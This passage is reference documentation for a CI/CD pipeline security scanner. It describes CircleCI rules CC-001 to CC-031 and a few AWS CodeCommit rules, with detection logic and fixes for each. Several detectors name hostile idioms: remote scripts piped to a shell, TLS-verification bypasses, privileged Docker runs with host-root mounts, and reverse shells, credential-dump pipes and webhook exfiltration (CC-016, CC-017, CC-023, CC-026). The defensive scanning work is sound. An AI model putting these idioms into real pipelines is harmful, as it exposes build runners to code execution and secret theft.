**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Orb references in the `orbs:` block must include an `@x.y.z` suffix to lock a specific version. References without `@`, with `@volatile`, or with only a major (`@1`) or major.minor (`@5.1`) version float and can silently pull in malicious updates.

**Recommendation.** Pin every orb to an exact semver version (`circleci/node@5.1.0`). Floating references like `@volatile`, `@1`, or bare names without `@` resolve to whatever is latest at build time, allowing a compromised orb update to execute in the pipeline.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`CC-001`](../providers/circleci.md#cc-001) in the [CircleCI provider](../providers/circleci.md).

### `CC-002`: Script injection via untrusted environment variable <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cc-002 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** CircleCI exposes environment variables like `$CIRCLE_BRANCH`, `$CIRCLE_TAG`, and `$CIRCLE_PR_NUMBER` that are controlled by the event source (branch name, tag, PR). Interpolating them unquoted into `run:` commands allows shell injection via specially crafted branch or tag names.

**Recommendation.** Do not interpolate attacker-controllable environment variables (CIRCLE_BRANCH, CIRCLE_TAG, CIRCLE_PR_NUMBER, etc.) directly into shell commands. Pass them through an intermediate variable and quote them, or use CircleCI pipeline parameters instead.

**Source:** [`CC-002`](../providers/circleci.md#cc-002) in the [CircleCI provider](../providers/circleci.md).

### `CC-003`: Docker image not pinned by digest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cc-003 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Docker images referenced in `docker:` blocks under jobs or executors must include an `@sha256:...` digest suffix. Tag-only references (`:latest`, `:18`) are mutable and can be replaced at any time by whoever controls the upstream registry.

**Recommendation.** Pin every Docker image to its sha256 digest: `cimg/node:18@sha256:abc123...`. Tags like `:latest` or `:18` are mutable, a registry compromise or upstream push silently replaces the image content.

**Source:** [`CC-003`](../providers/circleci.md#cc-003) in the [CircleCI provider](../providers/circleci.md).

### `CC-004`: Secret-like environment variable not managed via context <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-004 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** Jobs that declare environment variables with secret-looking names (containing PASSWORD, TOKEN, SECRET, or API_KEY) in inline `environment:` blocks bypass CircleCI's context restrictions, security groups, OIDC claims, and audit logs are only enforced when secrets live in contexts.

**Recommendation.** Move secret-like variables (PASSWORD, TOKEN, SECRET, API_KEY) into a CircleCI context and reference the context in the workflow job configuration. Contexts support security groups and audit logging that inline `environment:` blocks lack.

**Source:** [`CC-004`](../providers/circleci.md#cc-004) in the [CircleCI provider](../providers/circleci.md).

### `CC-005`: AWS auth uses long-lived access keys in environment block <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-005 }

**Evidences:** [`ESF-D-TOKEN-HYGIENE`](#ctrl-esf-d-token-hygiene) Use short-lived, federated credentials (OIDC), not long-lived tokens.

**How this is detected.** Long-lived AWS access keys declared directly in a job's `environment:` block are visible to anyone who can read the config. They cannot be rotated automatically and remain valid until manually revoked. OIDC-based federation yields short-lived credentials per build.

**Recommendation.** Remove AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY from the job `environment:` block. Use CircleCI's OIDC token with `aws-cli/setup` orb's role-based auth, or store credentials in a context with security group restrictions.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`CC-005`](../providers/circleci.md#cc-005) in the [CircleCI provider](../providers/circleci.md).

### `CC-006`: Artifacts not signed (no cosign/sigstore step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-006 }

**Evidences:** [`ESF-D-SIGN-ARTIFACTS`](#ctrl-esf-d-sign-artifacts) Sign build artifacts and verify signatures before release.

**How this is detected.** Unsigned artifacts cannot be verified downstream, so a tampered build is indistinguishable from a legitimate one. The check recognizes cosign, sigstore, slsa-framework, and notation-sign as signing tools.

**Recommendation.** Add a signing step to the pipeline, e.g. install cosign and run `cosign sign`, or use the `sigstore` CLI. Publish the signature alongside the artifact and verify it at consumption time.

**Source:** [`CC-006`](../providers/circleci.md#cc-006) in the [CircleCI provider](../providers/circleci.md).

### `CC-007`: SBOM not produced (no CycloneDX/syft/Trivy-SBOM step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-007 }

**Evidences:** [`ESF-D-SBOM`](#ctrl-esf-d-sbom) Produce SBOM / provenance metadata with every build.

**How this is detected.** Without an SBOM, downstream consumers cannot audit the exact set of dependencies shipped in the artifact, delaying vulnerability response when a transitive dep is disclosed. The check recognizes CycloneDX, syft, Anchore SBOM action, spdx-sbom-generator, Microsoft sbom-tool, and Trivy in SBOM mode.

**Recommendation.** Add an SBOM generation step, `syft . -o cyclonedx-json`, Trivy with `--format cyclonedx`, or Microsoft's `sbom-tool`. Attach the SBOM to the build artifacts so consumers can ingest it into their vulnerability management pipeline.

**Source:** [`CC-007`](../providers/circleci.md#cc-007) in the [CircleCI provider](../providers/circleci.md).

### `CC-008`: Credential-shaped literal in config body <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-008 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** Every string in the config is scanned against a set of credential patterns (AWS access keys, GitHub tokens, Slack tokens, JWTs, Stripe, Google, Anthropic, etc.). A match means a secret was pasted into YAML, the value is visible in every fork and every build log and must be treated as compromised.

**Recommendation.** Rotate the exposed credential immediately. Move the value to a CircleCI project environment variable or a context and reference it via the variable name. For cloud access, prefer OIDC federation over long-lived keys.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, AKIAI... examples). The AWS canonical example ``AKIAIOSFODNN7EXAMPLE`` is deliberately NOT suppressed, if it appears in a real pipeline it almost always means a copy-paste from docs was never substituted. Defaults to LOW confidence.

**Source:** [`CC-008`](../providers/circleci.md#cc-008) in the [CircleCI provider](../providers/circleci.md).

### `CC-009`: Deploy job missing manual approval gate <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-009 }

**Evidences:** [`ESF-C-APPROVAL`](#ctrl-esf-c-approval) Require explicit approval before production deployment, [`ESF-C-ENV-SEP`](#ctrl-esf-c-env-sep) Separate deployment environments (dev / staging / prod).

**How this is detected.** In CircleCI, manual approval is implemented by adding a job with `type: approval` to the workflow and making the deploy job require it. Without this gate, any push to the triggering branch deploys immediately with no human review.

**Recommendation.** Add a `type: approval` job that precedes the deploy job in the workflow, and list it in the deploy job's `requires:`. This ensures a human must click Approve in the CircleCI UI before production changes roll out.

**Source:** [`CC-009`](../providers/circleci.md#cc-009) in the [CircleCI provider](../providers/circleci.md).

### `CC-010`: Self-hosted runner without ephemeral marker <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-010 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers), [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** Self-hosted runners that persist between jobs leak filesystem and process state. A PR-triggered job writes to `/tmp`; a subsequent prod-deploy job on the same runner reads it. The check looks for `resource_class` values containing 'self-hosted', if found, it checks for 'ephemeral' in the value. Also checks for `machine: true` combined with a self-hosted resource class.

**Recommendation.** Configure self-hosted runners to tear down between jobs. Use a `resource_class` value that includes an ephemeral marker, or use CircleCI's machine executor with runner auto-scaling so each job gets a fresh environment.

**Source:** [`CC-010`](../providers/circleci.md#cc-010) in the [CircleCI provider](../providers/circleci.md).

### `CC-011`: No store_test_results step (test results not archived) <span class="pg-sev pg-sev--low">LOW</span> { #detail-cc-011 }

**Evidences:** [`ESF-D-BUILD-LOGS`](#ctrl-esf-d-build-logs) Generate and preserve build audit logs, [`ESF-C-AUDIT`](#ctrl-esf-c-audit) Audit deployment / pipeline activity and retain logs.

**How this is detected.** Without `store_test_results`, test output is only available in the raw build log. Archiving test results enables CircleCI's test insights, timing-based splitting, and provides an audit trail that links each build to its test outcomes.

**Recommendation.** Add a `store_test_results` step to jobs that run tests. This archives test results in CircleCI for traceability, trend analysis, and debugging flaky tests.

**Source:** [`CC-011`](../providers/circleci.md#cc-011) in the [CircleCI provider](../providers/circleci.md).

### `CC-012`: Dynamic config via `setup: true` enables code injection <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-012 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** When `setup: true` is set at the top level, the config becomes a setup workflow. It generates the real pipeline config dynamically (typically via the `circleci/continuation` orb). An attacker who controls the setup job (e.g. via a malicious PR in a fork) can inject arbitrary config for all subsequent jobs, including deploy steps with production secrets.

**Recommendation.** If `setup: true` is required, restrict the setup job to a trusted branch filter and audit the generated config carefully. Ensure the continuation orb's `configuration_path` points to a checked-in file, not a dynamically generated one that could be influenced by PR content.

**Source:** [`CC-012`](../providers/circleci.md#cc-012) in the [CircleCI provider](../providers/circleci.md).

### `CC-013`: Deploy job in workflow has no branch filter <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-013 }

**Evidences:** [`ESF-C-APPROVAL`](#ctrl-esf-c-approval) Require explicit approval before production deployment.

**How this is detected.** Without branch filters, a deploy job triggers on every branch push, including feature branches and forks. Restricting sensitive jobs to specific branches limits the blast radius of a compromised commit.

**Recommendation.** Add `filters.branches.only` to deploy-like workflow jobs so they only run on protected branches (e.g. main, release/*).

**Source:** [`CC-013`](../providers/circleci.md#cc-013) in the [CircleCI provider](../providers/circleci.md).

### `CC-014`: Job missing `resource_class` declaration <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-014 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers).

**How this is detected.** Without an explicit `resource_class`, CircleCI assigns a default executor. Declaring the class documents the expected scope and prevents accidental use of larger (or self-hosted) executors that may have elevated privileges.

**Recommendation.** Add `resource_class:` to every job to explicitly control the executor size and capabilities. Use the smallest class that satisfies build requirements.

**Source:** [`CC-014`](../providers/circleci.md#cc-014) in the [CircleCI provider](../providers/circleci.md).

### `CC-015`: No `no_output_timeout` configured <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-015 }

**Evidences:** [`ESF-D-BUILD-TIMEOUT`](#ctrl-esf-d-build-timeout) Enforce bounded build execution (single-use, time-limited).

**How this is detected.** Without `no_output_timeout`, a hung step can consume executor time indefinitely. Explicit timeouts cap cost and the window during which a compromised step has access to secrets and the build environment.

**Recommendation.** Add `no_output_timeout:` to long-running run steps, or set it at the job level. A reasonable default is 10-30 minutes. CircleCI's default of 10 minutes may be too long for some pipelines and absent for others.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`CC-015`](../providers/circleci.md#cc-015) in the [CircleCI provider](../providers/circleci.md).

### `CC-016`: Remote script piped to shell interpreter <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-016 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Detects `curl | bash`, `wget | sh`, and similar patterns that pipe remote content directly into a shell interpreter inside a CircleCI config. An attacker who controls the remote endpoint (or poisons DNS / CDN) gains arbitrary code execution in the CI runner.

**Recommendation.** Download the script to a file, verify its checksum, then execute it. Or vendor the script into the repository.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Established vendor installers (get.docker.com, sh.rustup.rs, bun.sh/install, awscli.amazonaws.com, cli.github.com, ...) ship via HTTPS from their own CDN and are idiomatic. This rule defaults to LOW confidence so CI gates can ignore them with --min-confidence MEDIUM; the finding still surfaces so teams that want cryptographic verification can audit.

**Source:** [`CC-016`](../providers/circleci.md#cc-016) in the [CircleCI provider](../providers/circleci.md).

### `CC-017`: Docker run with insecure flags (privileged/host mount) <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-017 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers).

**How this is detected.** Flags like `--privileged`, `--cap-add`, `--net=host`, or host-root volume mounts (`-v /:/`) in a CircleCI config give the container full access to the runner, enabling container escape and lateral movement.

**Recommendation.** Remove --privileged and --cap-add flags. Use minimal volume mounts. Prefer rootless containers.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`CC-017`](../providers/circleci.md#cc-017) in the [CircleCI provider](../providers/circleci.md).

### `CC-018`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-018 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Detects package-manager invocations that use plain HTTP registries (`--index-url http://`, `--registry=http://`) or disable TLS verification (`--trusted-host`, `--no-verify`) in a CircleCI config. These patterns allow man-in-the-middle injection of malicious packages.

**Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`CC-018`](../providers/circleci.md#cc-018) in the [CircleCI provider](../providers/circleci.md).

### `CC-019`: `add_ssh_keys` without fingerprint restriction <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cc-019 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** A bare `- add_ssh_keys` step (without `fingerprints:`) loads every SSH key configured on the project into the job. This violates least privilege, the job gains access to keys it does not need, increasing the blast radius if the job is compromised.

**Recommendation.** Always specify `fingerprints:` when using `add_ssh_keys` to restrict which SSH keys are loaded into the job. A bare `add_ssh_keys` step loads ALL project SSH keys.

**Source:** [`CC-019`](../providers/circleci.md#cc-019) in the [CircleCI provider](../providers/circleci.md).

### `CC-020`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-020 }

**Evidences:** [`ESF-S-VULN-MGMT`](#ctrl-esf-s-vuln-mgmt) Scan inbound artifacts (images, packages) for known vulnerabilities.

**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognizes trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck.

**Recommendation.** Add a vulnerability scanning step, trivy, grype, snyk test, npm audit, pip-audit, or osv-scanner. Publish results so vulnerabilities surface before deployment.

**Source:** [`CC-020`](../providers/circleci.md#cc-020) in the [CircleCI provider](../providers/circleci.md).

### `CC-021`: Package install without lockfile enforcement <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-021 }

**Evidences:** [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Detects package-manager install commands that do not enforce a lockfile or hash verification. Without lockfile enforcement the resolver pulls whatever version is currently latest, exactly the window a supply-chain attacker exploits.

**Recommendation.** Use lockfile-enforcing install commands: `npm ci` instead of `npm install`, `pip install --require-hashes -r requirements.txt`, `yarn install --frozen-lockfile`, `bundle install --frozen`, and `go install tool@v1.2.3`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`CC-021`](../providers/circleci.md#cc-021) in the [CircleCI provider](../providers/circleci.md).

### `CC-022`: Dependency update command bypasses lockfile pins <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-022 }

**Evidences:** [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Detects `pip install --upgrade`, `npm update`, `yarn upgrade`, `bundle update`, `cargo update`, `go get -u`, and `composer update`. These commands bypass lockfile pins and pull whatever version is currently latest. Tooling upgrades (`pip install --upgrade pip`) are exempted.

**Recommendation.** Remove dependency-update commands from CI. Use lockfile-pinned install commands (`npm ci`, `pip install -r requirements.txt`) and update dependencies via a dedicated PR workflow (e.g. Dependabot, Renovate).

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Common build-tool bootstrapping idioms (``pip install --upgrade pip``, ``pip install --upgrade setuptools wheel virtualenv``) and security-tool installs (``pip install --upgrade pip-audit / cyclonedx-bom / semgrep``) are exempted by the ``DEP_UPDATE_RE`` tooling allowlist. Other tooling-upgrade idioms not yet on the list can still trip the rule. Defaults to MEDIUM confidence so CI gates can require ``--min-confidence HIGH`` to ignore.

**Source:** [`CC-022`](../providers/circleci.md#cc-022) in the [CircleCI provider](../providers/circleci.md).

### `CC-023`: TLS / certificate verification bypass <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-023 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Detects patterns that disable TLS certificate verification: `git config http.sslVerify false`, `NODE_TLS_REJECT_UNAUTHORIZED=0`, `npm config set strict-ssl false`, `curl -k`, `wget --no-check-certificate`, `PYTHONHTTPSVERIFY=0`, and `GOINSECURE=`. Disabling TLS verification allows MITM injection of malicious packages, repositories, or build tools.

**Recommendation.** Remove TLS verification bypasses. Fix certificate issues at the source (install CA certificates, configure proper trust stores) instead of disabling verification.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`CC-023`](../providers/circleci.md#cc-023) in the [CircleCI provider](../providers/circleci.md).

### `CC-024`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-024 }

**Evidences:** [`ESF-D-SIGN-ARTIFACTS`](#ctrl-esf-d-sign-artifacts) Sign build artifacts and verify signatures before release, [`ESF-D-SBOM`](#ctrl-esf-d-sbom) Produce SBOM / provenance metadata with every build.

**How this is detected.** Signing (``cosign sign``) binds identity to bytes; attestation (``cosign attest``) binds a structured claim about *how* the artifact was built. SLSA verifiers check the latter so consumers can enforce builder/source/parameter policies.

**Recommendation.** Add a ``run: cosign attest`` command against a ``provenance.intoto.jsonl`` statement, or use the ``circleci/attestation`` orb. CC-006 covers signing; this rule covers the build-provenance step SLSA Build L3 requires.

**Source:** [`CC-024`](../providers/circleci.md#cc-024) in the [CircleCI provider](../providers/circleci.md).

### `CC-025`: Cache key derives from attacker-controllable input <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-025 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context, [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** CircleCI's ``restore_cache`` falls through each listed key until it finds a hit. When one of those keys is derived from ``CIRCLE_BRANCH``, ``CIRCLE_TAG``, or ``CIRCLE_PR_*``, values an attacker can set by opening a PR, the attacker can plant a cache entry that a protected job later uses. Uses checksum-of-lockfile or a static version label instead.

**Recommendation.** Derive ``save_cache`` and ``restore_cache`` keys from values the attacker can't control, the lockfile checksum (``{{ checksum "package-lock.json" }}``) and the build variant, not ``{{ .Branch }}`` or ``${CIRCLE_PR_NUMBER}``. A PR-scoped branch can seed a poisoned cache entry that a later main-branch run restores as trusted.

**Source:** [`CC-025`](../providers/circleci.md#cc-025) in the [CircleCI provider](../providers/circleci.md).

### `CC-026`: Config contains indicators of malicious activity <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-cc-026 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context, [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Fires on concrete indicators only (reverse shells, base64-decoded execution, miner binaries, Discord/Telegram webhooks, ``webhook.site`` callbacks, credential-dump pipes, history-erasure).

**Recommendation.** Treat as a potential compromise. Identify the PR that added the matching step(s), rotate any contexts/env vars the pipeline can reach, and audit recent CircleCI runs for outbound traffic to the matched hosts.

**Known false positives.**

- Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
- Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.

**Source:** [`CC-026`](../providers/circleci.md#cc-026) in the [CircleCI provider](../providers/circleci.md).

### `CC-027`: Dangerous shell idiom (eval, sh -c variable, backtick exec) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cc-027 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** Complements CC-002 (script injection from untrusted context). Fires on intrinsically risky shell idioms, ``eval``, ``sh -c "$X"``, backtick exec, regardless of whether the input source is currently trusted.

**Recommendation.** Replace ``eval "$VAR"`` / ``sh -c "$VAR"`` / backtick exec with direct command invocation. Validate or allow-list any value that must feed a dynamic command at the boundary.

**Known false positives.**

- ``eval "$(ssh-agent -s)"`` and similar ``eval "$(<literal-tool>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd.

**Source:** [`CC-027`](../providers/circleci.md#cc-027) in the [CircleCI provider](../providers/circleci.md).

### `CC-028`: Package install bypasses registry integrity (git / path / tarball source) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-028 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Complements CC-021 (missing lockfile flag). Git URL installs without a commit pin, local-path installs, and direct tarball URLs bypass the registry integrity controls the lockfile relies on.

**Recommendation.** Pin git dependencies to a commit SHA. Publish private packages to an internal registry instead of installing from a filesystem path or tarball URL.

**Source:** [`CC-028`](../providers/circleci.md#cc-028) in the [CircleCI provider](../providers/circleci.md).

### `CC-029`: Machine executor image not pinned <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cc-029 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** CC-003 covers Docker images declared under ``docker:`` blocks. It does not reach the machine executor, where the image is on ``machine.image``. A rolling tag (``current``, ``edge``, ``default``) pulls a fresh image whenever CircleCI publishes one, reintroducing the same supply-chain risk Docker-image pinning is designed to eliminate.

**Recommendation.** Pin every ``machine.image`` to a dated release tag, ``ubuntu-2204:2024.05.1`` rather than ``:current``, ``:edge``, ``:default``, or a bare image name. CircleCI rotates the ``current`` / ``edge`` aliases on its own cadence, so builds re-run on an image the author never reviewed.

**Source:** [`CC-029`](../providers/circleci.md#cc-029) in the [CircleCI provider](../providers/circleci.md).

### `CC-030`: Workflow job uses context without branch filter or approval gate <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-030 }

**Evidences:** [`ESF-C-APPROVAL`](#ctrl-esf-c-approval) Require explicit approval before production deployment.

**How this is detected.** CircleCI contexts are the recommended way to store shared secrets, but binding a context to a job is only half of least-privilege, the other half is controlling *when* the binding activates. Unrestricted workflow entries with ``context:`` turn every branch push into a secret-read event.

**Recommendation.** Either add ``filters.branches.only: [<protected branches>]`` to restrict when the context-bound job runs, or require a ``type: approval`` job in ``requires:`` so a human gates the secret-carrying execution. Without either gate, every push to the project loads the context's secrets into an ephemeral runner where any compromised step can exfiltrate them.

**Source:** [`CC-030`](../providers/circleci.md#cc-030) in the [CircleCI provider](../providers/circleci.md).

### `CC-031`: OIDC role assumption without branch filter or approval gate <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cc-031 }

**Evidences:** [`ESF-D-TOKEN-HYGIENE`](#ctrl-esf-d-token-hygiene) Use short-lived, federated credentials (OIDC), not long-lived tokens, [`ESF-C-APPROVAL`](#ctrl-esf-c-approval) Require explicit approval before production deployment.

**How this is detected.** Pairs with IAM-008. IAM-008 verifies the cloud-side trust policy pins audience + subject; this rule verifies the CircleCI-side workflow can't drive the role assumption from any branch. Distinct from CC-030 (broad context binding, MEDIUM); CC-031 narrows to OIDC role assumption and is HIGH because role-bound credentials reach further than the project-scoped secrets in a context.

**Recommendation.** Restrict every workflow job that passes a cloud ``role_arn`` (or equivalent OIDC parameter) to a protected branch list, or require a ``type: approval`` predecessor. Without either gate, any push triggers a cloud-role assumption with the full blast radius of the IdP-side trust policy.

**Source:** [`CC-031`](../providers/circleci.md#cc-031) in the [CircleCI provider](../providers/circleci.md).

### `CCM-000`: CodeCommit API access failed <span class="pg-sev pg-sev--info">INFO</span> { #detail-ccm-000 }

**Evidences:** [`ESF-C-AUDIT`](#ctrl-esf-c-audit) Audit deployment / pipeline activity and retain logs.

**How this is detected.** See [`AWS` provider documentation](../providers/aws.md) for the rule's detection mechanism.

**Recommendation.** See [`AWS` provider documentation](../providers/aws.md) for the recommended remediation.

**Source:** [`CCM-000`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CCM-001`: CodeCommit repository has no approval rule template attached <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ccm-001 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration.

**How this is detected.** Approval-rule templates are CodeCommit's analog of GitHub's branch-protection require-review. Without one associated, the repository accepts merges from any push-permitted principal, including the PR author themselves, without any second-pair-of-eyes gate.

**Recommendation.** Create a CodeCommit approval-rule template requiring at least one approval from a designated pool of reviewers and associate it with every repository. Without one, any PR author with push rights can self-approve and merge.

**Source:** [`CCM-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CCM-002`: CodeCommit repository not encrypted with customer KMS CMK <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ccm-002 }

**Evidences:** [`ESF-C-ARTIFACT-AUTHZ`](#ctrl-esf-c-artifact-authz) Restrict access to artifact storage and deployment pipelines.

**How this is detected.** Same shape as CA-001 / ECR-005 / S3 default encryption: the AWS-owned default key keeps the key policy under AWS, removing your ability to scope or audit Decrypt operations. Source code in the repo deserves the same key-policy + CloudTrail story you'd apply to artifacts in S3.

**Recommendation.** Recreate the repository with a ``kmsKeyId`` argument pointing at a customer-managed KMS key. CodeCommit encryption is set at creation and cannot be changed afterwards.

**Source:** [`CCM-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CCM-003`: CodeCommit trigger targets SNS/Lambda in a different account <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ccm-003 }

**Evidences:** [`ESF-C-ARTIFACT-AUTHZ`](#ctrl-esf-c-artifact-authz) Restrict access to artifact storage and deployment pipelines.

**How this is detected.** A repo trigger pointing at an SNS topic or Lambda in a different account fires under the receiving account's permissions on every push. Sometimes this is the intended shape (a centralized notifications account), but a cross-account fan-out from a compromised repo can drive actions in the receiving account that the source-account owner can't directly observe.

**Recommendation.** Move trigger targets into the same account as the repository or explicitly document the cross-account relationship. Cross-account triggers extend the blast radius of a repository compromise to whatever the target ARN can do.

**Source:** [`CCM-003`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CD-000`: CodeDeploy API access failed <span class="pg-sev pg-sev--info">INFO</span> { #detail-cd-000 }

